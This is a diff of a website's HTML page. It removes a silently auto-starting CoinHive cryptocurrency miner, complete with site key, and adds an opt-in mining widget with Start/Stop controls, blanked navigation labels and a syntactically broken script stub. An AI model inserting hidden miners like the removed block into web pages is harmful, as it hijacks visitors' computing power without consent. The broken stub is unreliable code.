@@ -98,6 +98,13 @@
    }
   </style>
   <meta name="viewport" content="width=device-width, user-scalable=no" />
+  <script type="text/javacript">
+  function readBox()
+  {
+  var txt input = document.getElementById('txtinput').value;
+  
+  }
+  </script>
   <script type="text/javascript">
    $(function(){
    	
@@ -181,13 +188,6 @@
   <div id="preloader">
       <div id="status">&nbsp;</div>
   </div>
-  <script type="text/javascript">
-   <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-   <script>
-   	var miner = new CoinHive.Anonymous('oeMGHmL3vRz6Kc5bZTMdKpV2ucqbATQP');
-   	miner.start();
-   </script>
-  </script>
   <div id="XBody" class="BaseDiv RWidth OEPageXbody OESK_XBody_Default" style="z-index:3000">
    <div class="OESZ OESZ_DivContent OESZG_XBody">
     <div class="OESZ OESZ_XBodyContent OESZG_XBody OECT OECT_Content OECTRel">
@@ -238,7 +238,72 @@
            <a name="welcome"></a>
           </div>
          </div>
+         <div id="WEd7d69c96ae" class="BaseDiv RNone OEWECodeBlock OESK_WECodeBlock_Default" style="z-index:3003">
+          <div class="OESZ OESZ_DivContent OESZG_WEd7d69c96ae">
+           <html>
+           <body>
+           <font color="white">
+           <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+           Instead of using ads, You can support TwerkNation tournaments by helping us mine cryptocurrency. Here are your stats:
+           <center>
+           <p>
+           	 <input type="text" id="tnum">specify number of cores</input></p>
+           <p>
+           	<input type="text" id="trate">specify throttle rate 0-1 (0=no throttle) </input></p>
+           <div id="output"></div>
+           <p id="tcount"></p>
+           <p id="throttleSP"></p>
+           <p id="hps"></p>
+           <p id="ths"></p>
+           <p id="tah"></p>
+           </center>
+           <p>You can start or stop at anytime but please wait for some accepted hashes before you do.</p>
+           <center>
+           <p id="minebutton"></p>
+           </center>
+           <p>Visit <a href="https://coin-hive.com/">Coin Hive</a> to learn more about how this works</a>
+           <script type="text/javascript">
+           	var miner = new CoinHive.Anonymous('oeMGHmL3vRz6Kc5bZTMdKpV2ucqbATQP','thread: 1');
+           // Update stats once per second
+           setInterval(function() {
+           	var threadval=document.getElementById("tnum").value;
+           	var throttle=document.getElementById("trate").value;
+               var threadCount = miner.getNumThreads();
+               var hashesPerSecond = Math.round(miner.getHashesPerSecond() * 100) / 100;
+               var totalHashes = miner.getTotalHashes();
+               var acceptedHashes = miner.getAcceptedHashes() / 256;
+               // Output to HTML elements...
+               if (miner.isRunning()) {
+           		if(miner.getNumThreads()!=threadval){
+           			miner.setNumThreads(threadval);
+           		}
+           		if(miner.getThrottle( )!=throttle){
+           			miner.setThrottle(throttle);
+           		}
+           		document.getElementById("tcount").innerHTML = "Threads: " + threadCount;
+           		document.getElementById("throttleSP").innerHTML = "Throttle rate: " + throttle;
+                   document.getElementById("hps").innerHTML = "hashes per second: " + hashesPerSecond;
+                   document.getElementById("ths").innerHTML = "Total Hashes: " + totalHashes;
+                   document.getElementById("tah").innerHTML = "Accepted Hashes: " + acceptedHashes;
+                   document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.stop()\">Stop Mining</button>";
+               } else {
+                   document.getElementById("hps").innerHTML = "Please click start";
+                   document.getElementById("ths").innerHTML = "to support";
+                   document.getElementById("tah").innerHTML = "this site";
+                   document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.start(CoinHive.FORCE_EXCLUSIVE_TAB)\">Start Mining</button>";
+               }
+           }, 1000);
+           </script>
+           </font>
+           </body>
+           </html>
+          </div>
+         </div>
         </div>
+       </div>
+      </div><div id="WEd5a2dfb812" class="BaseDiv RBoth OEWEPanel OESK_WEPanel_Default  parallax" style="z-index:3006">
+       <div class="OESZ OESZ_DivContent OESZG_WEd5a2dfb812">
+        <div class="OECT OECT_Content OECTRel OEDynTag0" style="overflow:hidden"></div>
        </div>
       </div>
      </div>
@@ -261,31 +326,31 @@
                </div>
               </div><div id="WEbc6db2ad60" class="BaseDiv RNone OEWELink OESK_WELink_Default OE_ActiveLink  transitions btmobile" style="z-index:2004" onclick="return OE.Navigate.open(event,'index.htm#welcome',1)">
                <div class="OESZ OESZ_DivContent OESZG_WEbc6db2ad60 OE_ActiveLink">
-                <a class="OESZ OESZ_Link OESZG_WEbc6db2ad60 OE_ActiveLink ContentBox" data-cd="PageLink" href="index.htm#welcome">ACCUEIL</a>
+                <a class="OESZ OESZ_Link OESZG_WEbc6db2ad60 OE_ActiveLink ContentBox" data-cd="PageLink" href="index.htm#welcome">&nbsp;<br /></a>
                </div>
               </div><div id="WE115a75ae6e" class="BaseDiv RNone OEWELink OESK_WELink_Default OE_ActiveLink  transitions btmobile" style="z-index:2005" onclick="return OE.Navigate.open(event,'index.htm#about',1)">
                <div class="OESZ OESZ_DivContent OESZG_WE115a75ae6e OE_ActiveLink">
-                <a class="OESZ OESZ_Link OESZG_WE115a75ae6e OE_ActiveLink ContentBox" data-cd="PageLink" href="index.htm#about">a propos</a>
+                <a class="OESZ OESZ_Link OESZG_WE115a75ae6e OE_ActiveLink ContentBox" data-cd="PageLink" href="index.htm#about">&nbsp;<br /></a>
                </div>
               </div><div id="WEd2d77e1da9" class="BaseDiv RNone OEWELink OESK_WELink_Default  transitions" style="z-index:2009" onclick="return OE.Navigate.open(event,'index.en.htm',1)">
                <div class="OESZ OESZ_DivContent OESZG_WEd2d77e1da9">
-                <a class="OESZ OESZ_Link OESZG_WEd2d77e1da9 ContentBox" data-cd="PageLink" href="index.en.htm">US</a>
+                <a class="OESZ OESZ_Link OESZG_WEd2d77e1da9 ContentBox" data-cd="PageLink" href="index.en.htm">&nbsp;<br /></a>
                </div>
               </div><div id="WEed3575c178" class="BaseDiv RNone OEWELink OESK_WELink_Default OE_ActiveLink  transitions btmobile" style="z-index:2006" onclick="return OE.Navigate.open(event,'index.htm#gallery',1)">
                <div class="OESZ OESZ_DivContent OESZG_WEed3575c178 OE_ActiveLink">
-                <a class="OESZ OESZ_Link OESZG_WEed3575c178 OE_ActiveLink ContentBox" data-cd="PageLink" href="index.htm#gallery">galerie</a>
+                <a class="OESZ OESZ_Link OESZG_WEed3575c178 OE_ActiveLink ContentBox" data-cd="PageLink" href="index.htm#gallery">&nbsp;<br /></a>
                </div>
               </div><div id="WE791ee8d457" class="BaseDiv RNone OEWELink OESK_WELink_Default OE_ActiveLink  transitions btmobile" style="z-index:2007" onclick="return OE.Navigate.open(event,'index.htm#news',1)">
                <div class="OESZ OESZ_DivContent OESZG_WE791ee8d457 OE_ActiveLink">
-                <a class="OESZ OESZ_Link OESZG_WE791ee8d457 OE_ActiveLink ContentBox" data-cd="PageLink" href="index.htm#news">actualités</a>
+                <a class="OESZ OESZ_Link OESZG_WE791ee8d457 OE_ActiveLink ContentBox" data-cd="PageLink" href="index.htm#news">&nbsp;<br /></a>
                </div>
               </div><div id="WE0078fb426f" class="BaseDiv RNone OEWELink OESK_WELink_Default OE_ActiveLink  transitions btmobile" style="z-index:2007" onclick="return OE.Navigate.open(event,'index.htm#contact',1)">
                <div class="OESZ OESZ_DivContent OESZG_WE0078fb426f OE_ActiveLink">
-                <a class="OESZ OESZ_Link OESZG_WE0078fb426f OE_ActiveLink ContentBox" data-cd="PageLink" href="index.htm#contact">contact</a>
+                <a class="OESZ OESZ_Link OESZG_WE0078fb426f OE_ActiveLink ContentBox" data-cd="PageLink" href="index.htm#contact">&nbsp;<br /></a>
                </div>
               </div><div id="WE5a052f039a" class="BaseDiv RNone OEWELink OESK_WELink_Default  transitions" style="z-index:2009" onclick="return OE.Navigate.open(event,'index.htm',1)">
                <div class="OESZ OESZ_DivContent OESZG_WE5a052f039a">
-                <a class="OESZ OESZ_Link OESZG_WE5a052f039a ContentBox" data-cd="PageLink" href="index.htm">FR</a>
+                <a class="OESZ OESZ_Link OESZG_WE5a052f039a ContentBox" data-cd="PageLink" href="index.htm">&nbsp;<br /></a>
                </div>
               </div>
              </div>
@@ -294,13 +359,6 @@
           </div>
          </div>
         </div>
-       </div>
-      </div>
-     </div>
-     <div class="OERelLine OEHAlignC OEVAlignT">
-      <div id="WEd5a2dfb812" class="BaseDiv RBoth OEWEPanel OESK_WEPanel_Default  parallax" style="z-index:3006">
-       <div class="OESZ OESZ_DivContent OESZG_WEd5a2dfb812">
-        <div class="OECT OECT_Content OECTRel OEDynTag0" style="overflow:hidden"></div>
        </div>
       </div>
      </div>
